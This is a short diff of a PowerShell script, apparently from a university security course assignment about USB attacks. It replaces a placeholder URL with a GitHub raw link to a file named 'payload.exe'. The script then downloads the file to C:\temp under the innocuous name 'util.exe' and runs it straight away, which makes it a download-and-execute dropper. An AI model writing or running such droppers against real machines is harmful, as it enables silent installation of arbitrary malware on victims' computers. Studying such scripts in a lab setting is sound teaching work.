@@ -1,4 +1,4 @@
-$url = "http://example.com/app.exe"
+$url = "https://raw.githubusercontent.com/tierChampion/INF8108-TP1-Usb/master/dist/payload.exe"
 $fileName = "util.exe"
 
 (New-Object System.Net.WebClient).DownloadFile("$url", "C:\temp\$fileName"); Start-Process "C:\temp\$fileName"
